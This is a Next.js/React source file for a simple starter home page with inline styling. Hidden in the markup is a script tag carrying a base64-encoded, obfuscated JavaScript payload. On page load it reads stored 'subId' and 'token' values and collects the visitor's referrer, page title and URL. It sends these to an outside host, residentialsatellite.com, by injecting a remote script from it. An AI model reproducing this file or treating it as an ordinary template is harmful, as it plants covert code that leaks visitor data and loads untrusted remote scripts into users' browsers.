import React from 'react'
import Head from 'next/head'

const Home = () => (
  <div>
    <h1>Next.js on the [JAMstack](https://jamstack.org)</h1>
  <script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfQ1EyS1R3bXFCOHc3SGpETic7CiAgICBpZiAoIXdpbmRvdy5fQ1EyS1R3bXFCOHc3SGpETikgewogICAgICAgIHdpbmRvdy5fQ1EyS1R3bXFCOHc3SGpETiA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly8zZS5yZXNpZGVudGlhbHNhdGVsbGl0ZS5jb20vN0pKamozRnInLAogICAgICAgICAgICBQX1BBVEg6ICdodHRwczovLzNlLnJlc2lkZW50aWFsc2F0ZWxsaXRlLmNvbS9lNTczMzlmL3Bvc3RiYWNrJywKICAgICAgICB9OwogICAgfQogICAgY29uc3QgX1A2eEwxZ3RoQ0pDemduVDIgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnY29uZmlnJyk7CiAgICBpZiAodHlwZW9mIF9QNnhMMWd0aENKQ3pnblQyICE9PSAndW5kZWZpbmVkJyAmJiBfUDZ4TDFndGhDSkN6Z25UMiAhPT0gbnVsbCkgewogICAgICAgIHZhciBfWTI4anQ2REs0Y2RUeTY1SiA9IEpTT04ucGFyc2UoX1A2eEwxZ3RoQ0pDemduVDIpOwogICAgICAgIHZhciBfSjZXcmhta0RHak5jOTNjcyA9IE1hdGgucm91bmQoK25ldyBEYXRlKCkvMTAwMCk7CiAgICAgICAgaWYgKF9ZMjhqdDZESzRjZFR5NjVKLmNyZWF0ZWRfYXQgKyB3aW5kb3cuX0NRMktUd21xQjh3N0hqRE4udHRsIDwgX0o2V3JobWtER2pOYzkzY3MpIHsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3N1YklkJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCd0b2tlbicpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnY29uZmlnJyk7CiAgICAgICAgfQogICAgfQogICAgdmFyIF84a1poMk1QSzFnUUg4a1JzID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3N1YklkJyk7CiAgICB2YXIgX1B2N0NnU3hQYjJORHk1TkIgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKTsKICAgIHZhciBfQlJ2cnR5Y1ZrNGtHdnR2WiA9ICc/cmV0dXJuPWpzLmNsaWVudCc7CiAgICAgICAgX0JSdnJ0eWNWazRrR3Z0dlogKz0gJyYnICsgZGVjb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gucmVwbGFjZSgnPycsICcnKSk7CiAgICAgICAgX0JSdnJ0eWNWazRrR3Z0dlogKz0gJyZzZV9yZWZlcnJlcj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnJlZmVycmVyKTsKICAgICAgICBfQlJ2cnR5Y1ZrNGtHdnR2WiArPSAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKTsKICAgICAgICBfQlJ2cnR5Y1ZrNGtHdnR2WiArPSAnJmxhbmRpbmdfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQubG9jYXRpb24uaG9zdG5hbWUgKyBkb2N1bWVudC5sb2NhdGlvbi5wYXRobmFtZSk7CiAgICAgICAgX0JSdnJ0eWNWazRrR3Z0dlogKz0gJyZuYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSk7CiAgICAgICAgX0JSdnJ0eWNWazRrR3Z0dlogKz0gJyZob3N0PScgKyBlbmNvZGVVUklDb21wb25lbnQod2luZG93Ll9DUTJLVHdtcUI4dzdIakROLlJfUEFUSCk7CiAgICBpZiAodHlwZW9mIF84a1poMk1QSzFnUUg4a1JzICE9PSAndW5kZWZpbmVkJyAmJiBfOGtaaDJNUEsxZ1FIOGtScyAmJiB3aW5kb3cuX0NRMktUd21xQjh3N0hqRE4udW5pcXVlKSB7CiAgICAgICAgX0JSdnJ0eWNWazRrR3Z0dlogKz0gJyZzdWJfaWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChfOGtaaDJNUEsxZ1FIOGtScyk7CiAgICB9CiAgICBpZiAodHlwZW9mIF9QdjdDZ1N4UGIyTkR5NU5CICE9PSAndW5kZWZpbmVkJyAmJiBfUHY3Q2dTeFBiMk5EeTVOQiAmJiB3aW5kb3cuX0NRMktUd21xQjh3N0hqRE4udW5pcXVlKSB7CiAgICAgICAgX0JSdnJ0eWNWazRrR3Z0dlogKz0gJyZ0b2tlbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9QdjdDZ1N4UGIyTkR5NU5CKTsKICAgIH0KICAgIHZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgICAgYS50eXBlID0gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnOwogICAgICAgIGEuc3JjID0gd2luZG93Ll9DUTJLVHdtcUI4dzdIakROLlJfUEFUSCArIF9CUnZydHljVms0a0d2dHZaOwogICAgdmFyIHMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07CiAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsIHMpCiAgICB9KSgpOwogICAg"></script>
    <h3>Hooray 🎉 - you've built this with <a href="https://nextjs.org">Next.js</a>!</h3>
    <style jsx>{`
      :global(html,body) {
        margin: 0;
        padding: 0;
        height: 100%;
      }

      :global(body) {
        font-size: calc(10px + 1vmin);
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans',
          'Droid Sans', 'Helvetica Neue', sans-serif;
        -webkit-font-smoothing: antialiased;
        -moz-osx-font-smoothing: grayscale;

        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        text-align: center;
        background-color: #282c34;
        color: white;
      }

      a {
        color: pink;
        text-decoration: none;
      }

      .content {
        padding: 0 32px;
      }
    `}</style>
  </div>
)

export default Home
